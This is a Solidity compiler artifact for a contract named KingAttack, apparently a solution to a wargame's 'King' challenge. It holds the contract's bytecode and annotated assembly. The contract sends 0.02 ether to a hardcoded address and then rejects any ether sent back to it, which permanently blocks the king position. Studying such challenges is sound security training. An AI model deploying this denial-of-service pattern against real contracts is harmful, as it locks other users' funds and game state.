{
	"King/KingAttack.sol": {
		"KingAttack": {
			"abi": [
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "sendEthToKing",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"King/KingAttack.sol\":491:1032  contract KingAttack{... */\n  mstore(0x40, 0x80)\n    /* \"King/KingAttack.sol\":531:532  0 */\n  0x00\n    /* \"King/KingAttack.sol\":516:532  uint s_count = 0 */\n  dup1\n  sstore\n    /* \"King/KingAttack.sol\":491:1032  contract KingAttack{... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"King/KingAttack.sol\":491:1032  contract KingAttack{... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x2fc0fe0d\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"King/KingAttack.sol\":890:891  1 */\n      0x01\n        /* \"King/KingAttack.sol\":880:887  s_count */\n      sload(0x00)\n        /* \"King/KingAttack.sol\":880:891  s_count < 1 */\n      lt\n        /* \"King/KingAttack.sol\":872:892  require(s_count < 1) */\n      tag_6\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_6:\n        /* \"King/KingAttack.sol\":922:923  1 */\n      0x01\n        /* \"King/KingAttack.sol\":912:919  s_count */\n      sload(0x00)\n        /* \"King/KingAttack.sol\":912:923  s_count + 1 */\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n        /* \"King/KingAttack.sol\":902:909  s_count */\n      0x00\n        /* \"King/KingAttack.sol\":902:923  s_count = s_count + 1 */\n      dup2\n      swap1\n      sstore\n      stop\n        /* \"King/KingAttack.sol\":491:1032  contract KingAttack{... */\n    tag_2:\n        /* \"King/KingAttack.sol\":990:991  1 */\n      0x01\n        /* \"King/KingAttack.sol\":980:987  s_count */\n      sload(0x00)\n        /* \"King/KingAttack.sol\":980:991  s_count < 1 */\n      lt\n        /* \"King/KingAttack.sol\":972:992  require(s_count < 1) */\n      tag_11\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_11:\n        /* \"King/KingAttack.sol\":1022:1023  1 */\n      0x01\n        /* \"King/KingAttack.sol\":1012:1019  s_count */\n      sload(0x00)\n        /* \"King/KingAttack.sol\":1012:1023  s_count + 1 */\n      tag_12\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_12:\n        /* \"King/KingAttack.sol\":1002:1009  s_count */\n      0x00\n        /* \"King/KingAttack.sol\":1002:1023  s_count = s_count + 1 */\n      dup2\n      swap1\n      sstore\n      stop\n        /* \"King/KingAttack.sol\":539:763  function sendEthToKing() public payable  {... */\n    tag_3:\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      stop\n    tag_14:\n        /* \"King/KingAttack.sol\":591:600  bool sent */\n      0x00\n        /* \"King/KingAttack.sol\":602:619  bytes memory data */\n      dup1\n        /* \"King/KingAttack.sol\":631:673  0x4ba6076d8D44410fd6a719d7AE1Cff984DF30210 */\n      0x4ba6076d8d44410fd6a719d7ae1cff984df30210\n        /* \"King/KingAttack.sol\":623:679  address(0x4ba6076d8D44410fd6a719d7AE1Cff984DF30210).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"King/KingAttack.sol\":687:704  20000000000000000 */\n      0x470de4df820000\n        /* \"King/KingAttack.sol\":623:709  address(0x4ba6076d8D44410fd6a719d7AE1Cff984DF30210).call{value: 20000000000000000}(\"\") */\n      mload(0x40)\n      tag_16\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_20\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_19)\n    tag_20:\n      0x60\n      swap2\n      pop\n    tag_19:\n      pop\n        /* \"King/KingAttack.sol\":590:709  (bool sent, bytes memory data) = address(0x4ba6076d8D44410fd6a719d7AE1Cff984DF30210).call{value: 20000000000000000}(\"\") */\n      swap2\n      pop\n      swap2\n      pop\n        /* \"King/KingAttack.sol\":727:731  sent */\n      dup2\n        /* \"King/KingAttack.sol\":719:756  require(sent, \"Failed to send Ether\") */\n      tag_21\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_22\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_21:\n        /* \"King/KingAttack.sol\":580:763  {... */\n      pop\n      pop\n        /* \"King/KingAttack.sol\":539:763  function sendEthToKing() public payable  {... */\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_24:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:270   */\n    tag_25:\n        /* \"#utility.yul\":138:215   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":135:136   */\n      0x00\n        /* \"#utility.yul\":128:216   */\n      mstore\n        /* \"#utility.yul\":235:239   */\n      0x11\n        /* \"#utility.yul\":232:233   */\n      0x04\n        /* \"#utility.yul\":225:240   */\n      mstore\n        /* \"#utility.yul\":259:263   */\n      0x24\n        /* \"#utility.yul\":256:257   */\n      0x00\n        /* \"#utility.yul\":249:264   */\n      revert\n        /* \"#utility.yul\":276:467   */\n    tag_8:\n        /* \"#utility.yul\":316:319   */\n      0x00\n        /* \"#utility.yul\":335:355   */\n      tag_36\n        /* \"#utility.yul\":353:354   */\n      dup3\n        /* \"#utility.yul\":335:355   */\n      tag_24\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":330:355   */\n      swap2\n      pop\n        /* \"#utility.yul\":369:389   */\n      tag_37\n        /* \"#utility.yul\":387:388   */\n      dup4\n        /* \"#utility.yul\":369:389   */\n      tag_24\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":364:389   */\n      swap3\n      pop\n        /* \"#utility.yul\":412:413   */\n      dup3\n        /* \"#utility.yul\":409:410   */\n      dup3\n        /* \"#utility.yul\":405:414   */\n      add\n        /* \"#utility.yul\":398:414   */\n      swap1\n      pop\n        /* \"#utility.yul\":433:436   */\n      dup1\n        /* \"#utility.yul\":430:431   */\n      dup3\n        /* \"#utility.yul\":427:437   */\n      gt\n        /* \"#utility.yul\":424:460   */\n      iszero\n      tag_38\n      jumpi\n        /* \"#utility.yul\":440:458   */\n      tag_39\n      tag_25\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":424:460   */\n    tag_38:\n        /* \"#utility.yul\":276:467   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":473:620   */\n    tag_26:\n        /* \"#utility.yul\":574:585   */\n      0x00\n        /* \"#utility.yul\":611:614   */\n      dup2\n        /* \"#utility.yul\":596:614   */\n      swap1\n      pop\n        /* \"#utility.yul\":473:620   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":626:740   */\n    tag_27:\n      pop\n      jump\t// out\n        /* \"#utility.yul\":746:1144   */\n    tag_28:\n        /* \"#utility.yul\":905:908   */\n      0x00\n        /* \"#utility.yul\":926:1009   */\n      tag_43\n        /* \"#utility.yul\":1007:1008   */\n      0x00\n        /* \"#utility.yul\":1002:1005   */\n      dup4\n        /* \"#utility.yul\":926:1009   */\n      tag_26\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":919:1009   */\n      swap2\n      pop\n        /* \"#utility.yul\":1018:1111   */\n      tag_44\n        /* \"#utility.yul\":1107:1110   */\n      dup3\n        /* \"#utility.yul\":1018:1111   */\n      tag_27\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":1136:1137   */\n      0x00\n        /* \"#utility.yul\":1131:1134   */\n      dup3\n        /* \"#utility.yul\":1127:1138   */\n      add\n        /* \"#utility.yul\":1120:1138   */\n      swap1\n      pop\n        /* \"#utility.yul\":746:1144   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1150:1529   */\n    tag_17:\n        /* \"#utility.yul\":1334:1337   */\n      0x00\n        /* \"#utility.yul\":1356:1503   */\n      tag_46\n        /* \"#utility.yul\":1499:1502   */\n      dup3\n        /* \"#utility.yul\":1356:1503   */\n      tag_28\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":1349:1503   */\n      swap2\n      pop\n        /* \"#utility.yul\":1520:1523   */\n      dup2\n        /* \"#utility.yul\":1513:1523   */\n      swap1\n      pop\n        /* \"#utility.yul\":1150:1529   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1535:1704   */\n    tag_29:\n        /* \"#utility.yul\":1619:1630   */\n      0x00\n        /* \"#utility.yul\":1653:1659   */\n      dup3\n        /* \"#utility.yul\":1648:1651   */\n      dup3\n        /* \"#utility.yul\":1641:1660   */\n      mstore\n        /* \"#utility.yul\":1693:1697   */\n      0x20\n        /* \"#utility.yul\":1688:1691   */\n      dup3\n        /* \"#utility.yul\":1684:1698   */\n      add\n        /* \"#utility.yul\":1669:1698   */\n      swap1\n      pop\n        /* \"#utility.yul\":1535:1704   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1710:1880   */\n    tag_30:\n        /* \"#utility.yul\":1850:1872   */\n      0x4661696c656420746f2073656e64204574686572000000000000000000000000\n        /* \"#utility.yul\":1846:1847   */\n      0x00\n        /* \"#utility.yul\":1838:1844   */\n      dup3\n        /* \"#utility.yul\":1834:1848   */\n      add\n        /* \"#utility.yul\":1827:1873   */\n      mstore\n        /* \"#utility.yul\":1710:1880   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1886:2252   */\n    tag_31:\n        /* \"#utility.yul\":2028:2031   */\n      0x00\n        /* \"#utility.yul\":2049:2116   */\n      tag_50\n        /* \"#utility.yul\":2113:2115   */\n      0x14\n        /* \"#utility.yul\":2108:2111   */\n      dup4\n        /* \"#utility.yul\":2049:2116   */\n      tag_29\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":2042:2116   */\n      swap2\n      pop\n        /* \"#utility.yul\":2125:2218   */\n      tag_51\n        /* \"#utility.yul\":2214:2217   */\n      dup3\n        /* \"#utility.yul\":2125:2218   */\n      tag_30\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":2243:2245   */\n      0x20\n        /* \"#utility.yul\":2238:2241   */\n      dup3\n        /* \"#utility.yul\":2234:2246   */\n      add\n        /* \"#utility.yul\":2227:2246   */\n      swap1\n      pop\n        /* \"#utility.yul\":1886:2252   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2258:2677   */\n    tag_23:\n        /* \"#utility.yul\":2424:2428   */\n      0x00\n        /* \"#utility.yul\":2462:2464   */\n      0x20\n        /* \"#utility.yul\":2451:2460   */\n      dup3\n        /* \"#utility.yul\":2447:2465   */\n      add\n        /* \"#utility.yul\":2439:2465   */\n      swap1\n      pop\n        /* \"#utility.yul\":2511:2520   */\n      dup2\n        /* \"#utility.yul\":2505:2509   */\n      dup2\n        /* \"#utility.yul\":2501:2521   */\n      sub\n        /* \"#utility.yul\":2497:2498   */\n      0x00\n        /* \"#utility.yul\":2486:2495   */\n      dup4\n        /* \"#utility.yul\":2482:2499   */\n      add\n        /* \"#utility.yul\":2475:2522   */\n      mstore\n        /* \"#utility.yul\":2539:2670   */\n      tag_53\n        /* \"#utility.yul\":2665:2669   */\n      dup2\n        /* \"#utility.yul\":2539:2670   */\n      tag_31\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":2531:2670   */\n      swap1\n      pop\n        /* \"#utility.yul\":2258:2677   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212203113ea0c0d470fdbe7114f4a55ddfbfb8f050e5476c0f78fc60737170b02f9f164736f6c63430008120033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040526000805534801561001457600080fd5b506102ae806100246000396000f3fe6080604052600436106100225760003560e01c80632fc0fe0d146100715761004c565b3661004c5760016000541061003657600080fd5b60016000546100459190610181565b6000819055005b60016000541061005b57600080fd5b600160005461006a9190610181565b6000819055005b61007961007b565b005b600080734ba6076d8d44410fd6a719d7ae1cff984df3021073ffffffffffffffffffffffffffffffffffffffff1666470de4df8200006040516100bd906101e6565b60006040518083038185875af1925050503d80600081146100fa576040519150601f19603f3d011682016040523d82523d6000602084013e6100ff565b606091505b509150915081610144576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161013b90610258565b60405180910390fd5b5050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061018c82610148565b915061019783610148565b92508282019050808211156101af576101ae610152565b5b92915050565b600081905092915050565b50565b60006101d06000836101b5565b91506101db826101c0565b600082019050919050565b60006101f1826101c3565b9150819050919050565b600082825260208201905092915050565b7f4661696c656420746f2073656e64204574686572000000000000000000000000600082015250565b60006102426014836101fb565b915061024d8261020c565b602082019050919050565b6000602082019050818103600083015261027181610235565b905091905056fea26469706673582212203113ea0c0d470fdbe7114f4a55ddfbfb8f050e5476c0f78fc60737170b02f9f164736f6c63430008120033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x14 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2AE DUP1 PUSH2 0x24 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x22 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2FC0FE0D EQ PUSH2 0x71 JUMPI PUSH2 0x4C JUMP JUMPDEST CALLDATASIZE PUSH2 0x4C JUMPI PUSH1 0x1 PUSH1 0x0 SLOAD LT PUSH2 0x36 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 SLOAD PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x181 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 SSTORE STOP JUMPDEST PUSH1 0x1 PUSH1 0x0 SLOAD LT PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 SLOAD PUSH2 0x6A SWAP2 SWAP1 PUSH2 0x181 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 SSTORE STOP JUMPDEST PUSH2 0x79 PUSH2 0x7B JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH20 0x4BA6076D8D44410FD6A719D7AE1CFF984DF30210 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH7 0x470DE4DF820000 PUSH1 0x40 MLOAD PUSH2 0xBD SWAP1 PUSH2 0x1E6 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0xFA JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0xFF JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH2 0x144 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x13B SWAP1 PUSH2 0x258 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x18C DUP3 PUSH2 0x148 JUMP JUMPDEST SWAP2 POP PUSH2 0x197 DUP4 PUSH2 0x148 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x1AF JUMPI PUSH2 0x1AE PUSH2 0x152 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1D0 PUSH1 0x0 DUP4 PUSH2 0x1B5 JUMP JUMPDEST SWAP2 POP PUSH2 0x1DB DUP3 PUSH2 0x1C0 JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F1 DUP3 PUSH2 0x1C3 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4661696C656420746F2073656E64204574686572000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x242 PUSH1 0x14 DUP4 PUSH2 0x1FB JUMP JUMPDEST SWAP2 POP PUSH2 0x24D DUP3 PUSH2 0x20C JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x271 DUP2 PUSH2 0x235 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 BALANCE SGT 0xEA 0xC 0xD SELFBALANCE 0xF 0xDB 0xE7 GT 0x4F 0x4A SSTORE 0xDD 0xFB 0xFB DUP16 SDIV 0xE SLOAD PUSH23 0xC0F78FC60737170B02F9F164736F6C6343000812003300 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "137200",
						"executionCost": "5189",
						"totalCost": "142389"
					},
					"external": {
						"": "infinite",
						"sendEthToKing()": "infinite"
					}
				},
				"methodIdentifiers": {
					"sendEthToKing()": "2fc0fe0d"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 73,
						"contract": "King/KingAttack.sol:KingAttack",
						"label": "s_count",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}